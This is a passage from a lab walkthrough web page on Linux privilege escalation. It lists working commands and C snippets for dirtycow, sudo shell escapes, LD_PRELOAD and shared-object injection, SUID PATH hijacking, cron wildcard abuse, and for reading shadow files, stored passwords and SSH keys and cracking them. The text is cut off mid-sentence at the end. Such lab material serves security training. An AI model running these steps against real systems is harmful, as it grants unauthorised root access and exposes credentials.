<!DOCTYPE HTML>
<html>

<head>
	<title>Linux PrivEsc Arena</title>
	<link rel="apple-touch-icon" sizes="180x180" href="../../images/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon/favicon-16x16.png">
	<link rel="manifest" href="../../images/favicon/site.webmanifest">
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
	<link rel="stylesheet" href="../../assets/css/main.css" />
	<noscript>
		<link rel="stylesheet" href="../../assets/css/noscript.css" /></noscript>
</head>

<body class="is-preload">

	<!-- Wrapper -->
	<div id="wrapper">

		<!-- Header -->
		<header id="header" class="alt">
			<nav>
				<a href="#menu">Menu</a>
			</nav>
		</header>

		<!-- Menu -->
		<nav id="menu">
			<ul class="links">
				<li><a href="../../index.html">Home</a></li>
				<li><a href="../../tools_landing.html">Hacking Tools</a></li>
				<li><a href="../../linux_landing.html">Vulnerabilities on Linux</a></li>
				<li><a href="../../windows_landing.html">Vulnerabilities on Windows</a></li>
				<li><a href="../../web_landing.html">Vulnerabilities on Web</a></li>
				<li><a href="../../malware_analyses_landing.html">Malware Analysis</a></li>
				<li><a href="../../network_services_landing.html">Network Services</a></li>
				<li><a href="../../ctf_landing.html">Capture the Flag</a></li>
				<li><a href="../../miscellaneous_landing.html">Miscellaneous</a></li>
				<li><a href="https://github.com/martinkubecka"><img alt="Github" src="../../images/github_logo.png"/></a></li>
			</ul>
		</nav>

		<!-- Main -->
		<div id="main" class="alt">

			<!-- One -->
			<section id="one">
				<div class="inner">
					<header class="major">
						<h1>Linux PrivEsc Arena</h1>
					</header>

					<span style="font-size: 16pt">2020/11/16<br /><br /></span>

					<ul>
						<li>This room will teach you a variety of Linux privilege escalation tactics, including kernel
							exploits, sudo attacks, SUID attacks, scheduled task attacks, and more. </li>
						<li>This lab was built utilizing Sagi Shahar's privesc workshop (<a
								href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a>)
							and utilized as part of The Cyber Mentor's Linux Privilege Escalation Udemy course (<a
								href="http://udemy.com/course/linux-privilege-escalation-for-beginners">http://udemy.com/course/linux-privilege-escalation-for-beginners</a>).
						</li>
					</ul>
					<ul>
						<li>All tools needed to complete this course are in the user folder (/home/user/tools).</li>
					</ul>
					<br />
					<hr /><span style="font-size: 12pt">
						<ul><b>
								<li style="list-style-type: none">Kernel Exploits</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:
								<i>/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh</i></li>
							<li style="list-style-type: none">From the output, notice that the OS is vulnerable to
								“dirtycow”.</li>
							<li style="list-style-type: none"></li>
							<b>
								<li style="list-style-type: none"><img src="image.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none">Exploitation</li>
							</b>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>gcc -pthread
									/home/user/tools/dirtycow/c0w.c -o c0w</i></li>
							<li style="list-style-type: none">In command prompt type: <i>./c0w</i></li>
							<li style="list-style-type: none">In command prompt type: <i>passwd</i></li>
							<li style="list-style-type: none">In command prompt type: <i>id</i></li>
						</ul>
						
						<b>
							<hr />
							<ul>
								<li style="list-style-type: none">Stored Passwords (Config Files)</li>
							</ul>
						</b>
						<ul><b>
								<li style="list-style-type: none">Exploitation</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;cat
									/home/user/myvpn.ovpn</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 2.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, make note of the value of the
								<b>“auth-user-pass”</b>&nbsp;directive.</li>
							<li style="list-style-type: none">In command prompt type: <i>cat /etc/openvpn/auth.txt</i>
							</li>
							<i>
								<li style="list-style-type: none"></li>
							</i><b>
								<li style="list-style-type: none"><img src="image 3.png" /></li>
							</b>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, make note of the clear-text credentials.
							</li>
							<li style="list-style-type: none">In command prompt type: cat /home/user/.irssi/config |
								grep -i passw</li>
							<li style="list-style-type: none">From the output, make note of the clear-text
								credentials.<b></b></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 4.png" /></li>
							</b>
						</ul>
						<b>
							<hr />
							<ul>
								<li style="list-style-type: none">Stored Passwords (History)</li>
							</ul>
						</b>
						<ul>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>cat ~/.bash_history | grep -i
									passw</i></li>
							<li style="list-style-type: none">From the output, make note of the clear-text
								credentials.<b></b></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 5.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Weak File Permissions</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>ls -la /etc/shadow</i></li>
							<li style="list-style-type: none">Note the file permissions</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 6.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>cat /etc/passwd</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 7.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Save the output to a file on your attacker machine</li>
							<li style="list-style-type: none">In command prompt type: <i>cat /etc/shadow</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 8.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Save the output to a file on your attacker machine</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Attacker VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>unshadow &lt;PASSWORD-FILE&gt;
									&lt;SHADOW-FILE&gt; &gt; unshadowed.txt</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 10.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Now, you have an unshadowed file.</li>
							<li style="list-style-type: none">Crack the hashes: <i>hashcat -m 1800 unshadowed.txt
									rockyou.txt -O</i></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 9.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">SSH Keys</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>find / -name authorized_keys
									2&gt; /dev/null</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 11.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In a command prompt type: <i>find / -name id_rsa 2&gt;
									/dev/null</i></li>
							<li style="list-style-type: none">Note the results.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 12.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Copy the contents of the discovered <b>id_rsa
									file</b>&nbsp;to a file on your attacker VM.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 13.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Attacker VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;chmod 400 id_rsa</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 15.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>ssh -i id_rsa
									root@&lt;ip&gt;</i></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 14.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Sudo (Shell Escaping)</li>
							</b>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Detection﻿</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>sudo -l</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 16.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, notice the list of programs that can run
								via sudo.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type any of the following:</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">
								<ul><i>
										<li style="list-style-type: none">sudo find /bin -name nano -exec /bin/sh \;
										</li>
										<li style="list-style-type: none">sudo awk 'BEGIN {system("/bin/sh")}'</li>
										<li style="list-style-type: none">echo "os.execute('/bin/sh')" &gt; shell.nse
											&amp;&amp; sudo nmap --script=shell.nse</li>
									</i>
									<li style="list-style-type: none"><i>sudo vim -c '!sh'</i><b></b></li>
								</ul>
							</li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 17.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Sudo (Abusing Intended Functionality)</li>
							</b>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>sudo -l</i></li>
							<li style="list-style-type: none">From the output, notice the list of programs that can run
								via sudo.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>sudo apache2 -f /etc/shadow</i>
							</li>
							<li style="list-style-type: none">From the output, copy the root hash.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 18.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Attacker VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Open command prompt and type: <i>echo '[Pasted Root Hash]'
									&gt; hash.txt</i></li>
							<li style="list-style-type: none">In command prompt type: <i>john
									--wordlist=/usr/share/wordlists/nmap.lst hash.txt</i></li>
							<li style="list-style-type: none">From the output, notice the cracked credentials.<b></b>
							</li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 19.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Sudo (LD_PRELOAD)</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: sudo -l</li>
							<li style="list-style-type: none">From the output, notice that the LD_PRELOAD environment
								variable is intact.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 20.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Open a text editor and type:</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">
								<ul><i>
										<li style="list-style-type: none">#include &lt;stdio.h&gt;</li>
										<li style="list-style-type: none">#include &lt;sys/types.h&gt;</li>
										<li style="list-style-type: none">#include &lt;stdlib.h&gt;</li>
										<li style="list-style-type: none"></li>
										<li style="list-style-type: none">void _init() {</li>
										<li style="list-style-type: none">&nbsp; &nbsp; unsetenv("LD_PRELOAD");</li>
										<li style="list-style-type: none">&nbsp; &nbsp; setgid(0);</li>
										<li style="list-style-type: none">&nbsp; &nbsp; setuid(0);</li>
										<li style="list-style-type: none">&nbsp; &nbsp; system("/bin/bash");</li>
										<li style="list-style-type: none">}</li>
									</i>
									<li style="list-style-type: none"></li>
								</ul>
							</li>
							<li style="list-style-type: none">Save the file as <b>x.c</b></li>
							<li style="list-style-type: none">In command prompt type: <i>gcc -fPIC -shared -o /tmp/x.so
									x.c -nostartfiles</i></li>
							<li style="list-style-type: none">In command prompt type: <i>sudo LD_PRELOAD=/tmp/x.so
									apache2</i></li>
							<li style="list-style-type: none">In command prompt type: id</li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 21.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">SUID (Shared Object Injection)</li>
							</b>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;find / -type f -perm
									-04000 -ls 2&gt;/dev/null</i></li>
							<li style="list-style-type: none">From the output, make note of all the <b>SUID
									binaries</b>.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 22.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command line type: <i>strace /usr/local/bin/suid-so
									2&gt;&amp;1 | grep -i -E "open|access|no such file"</i></li>
							<li style="list-style-type: none">From the output, notice that a .so file is missing from a
								writable directory.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 23.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>mkdir /home/user/.config</i>
							</li>
							<li style="list-style-type: none">In command prompt type: <i>cd /home/user/.config</i></li>
							<li style="list-style-type: none">Open a text editor and type:</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">
								<ul><i>
										<li style="list-style-type: none">#include &lt;stdio.h&gt;</li>
										<li style="list-style-type: none">#include &lt;stdlib.h&gt;</li>
										<li style="list-style-type: none"></li>
										<li style="list-style-type: none">static void inject()
											__attribute__((constructor));</li>
										<li style="list-style-type: none"></li>
										<li style="list-style-type: none">void inject() {</li>
										<li style="list-style-type: none">&nbsp; &nbsp; system("cp /bin/bash /tmp/bash
											&amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");</li>
									</i>
									<li style="list-style-type: none"><i>}</i></li>
								</ul>
							</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Save the file as <b>libcalc.c</b></li>
							<li style="list-style-type: none">In command prompt type: <i>gcc -shared -o
									/home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c</i></li>
							<li style="list-style-type: none">In command prompt type: <i>/usr/local/bin/suid-so</i></li>
							<li style="list-style-type: none">In command prompt type: <i>id</i></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 24.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">SUID (Symlinks)</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>dpkg -l | grep nginx</i></li>
							<li style="list-style-type: none">From the output, notice that the installed
								<b>nginx</b>&nbsp;<b>version</b>&nbsp;is below <b>1.6.2-5+deb8u3.</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 25.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM – Terminal 1</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:
								<i>/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log</i></li>
							<li style="list-style-type: none"></li>
							<b>
								<li style="list-style-type: none"><img src="image 26.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none">At this stage, the system waits for logrotate to execute.
							</li>
							<li style="list-style-type: none">In order to speed up the process, this will be simulated
								by connecting to the Linux VM via a different terminal.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM – Terminal 2</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">As root, type the following: <i>invoke-rc.d nginx rotate
									&gt;/dev/null 2&gt;&amp;1</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 28.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Switch back to the previous terminal.</li>
							<li style="list-style-type: none"></li>
							<u>
								<li style="list-style-type: none">Linux VM – Terminal 1</li>
							</u>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, notice that the exploit continued its
								execution.</li>
							<li style="list-style-type: none">In command prompt type: <i>id</i></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 27.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">SUID (Environment Variables #1)</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>find / -type f -perm -04000 -ls
									2&gt;/dev/null</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 29.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, make note of all the SUID binaries.</li>
							<li style="list-style-type: none">In command prompt type: <i>strings
									/usr/local/bin/suid-env</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 30.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, notice the functions used by the binary.
							</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>echo 'int main() { setgid(0);
									setuid(0); system("/bin/bash"); return 0; }' &gt; /tmp/service.c</i></li>
							<li style="list-style-type: none">In command prompt type: <i>gcc /tmp/service.c -o
									/tmp/service</i></li>
							<li style="list-style-type: none">In command prompt type: <i>export PATH=/tmp:$PATH</i></li>
							<li style="list-style-type: none">In command prompt type: <i>/usr/local/bin/suid-env</i>
							</li>
							<li style="list-style-type: none">In command prompt type: <i>id</i></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 31.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">SUID (Environment Variables #2)</li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none">Detection</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>find / -type f -perm -04000 -ls
									2&gt;/dev/null</i></li>
							<li style="list-style-type: none">From the output, make note of all the SUID binaries.</li>
							<li style="list-style-type: none">In command prompt type: <i>strings
									/usr/local/bin/suid-env2</i></li>
							<li style="list-style-type: none">From the output, notice the functions used by the binary.
							</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><img src="image 46.png" /></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation Method #1</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;function
									/usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp;
									/tmp/bash -p; }</i></li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;export -f
									/usr/sbin/service</i></li>
							<li style="list-style-type: none">In command prompt
								type:<i>&nbsp;/usr/local/bin/suid-env2</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation Method #2</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>env -i SHELLOPTS=xtrace
									PS4='$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +s
									/tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'<b></b></i>
							</li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 32.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Capabilities</li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none">Detection</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>getcap -r / 2&gt;/dev/null</i>
							</li>
							<li style="list-style-type: none">From the output, notice the value of the
								<b>“cap_setuid”</b>&nbsp;capability.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 33.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>/usr/bin/python2.6 -c 'import
									os; os.setuid(0); os.system("/bin/bash")'</i></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 34.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Cron (Path)</li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none">Detection</li>
							</b>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>cat /etc/crontab</i></li>
							<li style="list-style-type: none">From the output, notice the value of the
								<b>“PATH”</b>&nbsp;variable.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 35.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>echo 'cp /bin/bash /tmp/bash;
									chmod +s /tmp/bash' &gt; /home/user/overwrite.sh</i></li>
							<li style="list-style-type: none">In command prompt type: <i>chmod +x
									/home/user/overwrite.sh</i></li>
							<li style="list-style-type: none">Wait 1 minute for the Bash script to execute.</li>
							<li style="list-style-type: none">In command prompt type: <i>/tmp/bash -p</i></li>
							<li style="list-style-type: none">In command prompt type: <i>id</i><b></b></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 36.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b>
							<hr /></b>
						<ul><b>
								<li style="list-style-type: none">Cron (Wildcards)</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>cat /etc/crontab</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 37.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, notice the script
								“/usr/local/bin/compress.sh”</li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;cat
									/usr/local/bin/compress.sh</i></li>
							<i>
								<li style="list-style-type: none"></li>
							</i>
							<li style="list-style-type: none"><b><img src="image 38.png" /></b><i></i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">From the output, notice the wildcard (*) used by ‘tar’.
							</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type:</li>
							<li style="list-style-type: none">
								<ul><i>
										<li style="list-style-type: none">echo 'cp /bin/bash /tmp/bash; chmod +s
											/tmp/bash' &gt; /home/user/runme.sh</li>
										<li style="list-style-type: none">touch /home/user/--checkpoint=1</li>
										<li style="list-style-type: none">touch /home/user/--checkpoint-action=exec=sh\
											runme.sh</li>
									</i>
									<li style="list-style-type: none"></li>
								</ul>
							</li>
							<li style="list-style-type: none">Wait 1 minute for the Bash script to execute.</li>
							<li style="list-style-type: none">In command prompt type: <i>/tmp/bash -p</i></li>
							<li style="list-style-type: none">In command prompt type: <i>id</i><b></b></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 39.png" /></li>
								<li style="list-style-type: none"></li>
							</b>
						</ul>
						<b></b>
					</span>
					<ul><span style="font-size: 12pt"><b>
								<li style="list-style-type: none">
									<hr />
								</li>
								<li style="list-style-type: none">Cron (File Overwrite)</li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none">Detection</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>cat /etc/crontab</i></li>
							<li style="list-style-type: none">From the output, notice the
								script<b>&nbsp;“overwrite.sh”</b></li>
							<li style="list-style-type: none">In command prompt type:<i>&nbsp;ls -l
									/usr/local/bin/overwrite.sh</i></li>
							<li style="list-style-type: none">From the output, notice the file permissions.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 40.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>echo 'cp /bin/bash /tmp/bash;
									chmod +s /tmp/bash' &gt;&gt; /usr/local/bin/overwrite.sh</i></li>
							<li style="list-style-type: none">Wait 1 minute for the Bash script to execute.</li>
							<li style="list-style-type: none">In command prompt type: <i>/tmp/bash -p</i></li>
							<li style="list-style-type: none">In command prompt type: <i>id</i><b></b></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 41.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none">
									<hr />
								</li>
								<li style="list-style-type: none">NFS Root Squashing</li>
								<li style="list-style-type: none"></li>
							</b>
							<li style="list-style-type: none"><b>Detection</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command line type: <i>cat /etc/exports</i></li>
							<li style="list-style-type: none">From the output, notice
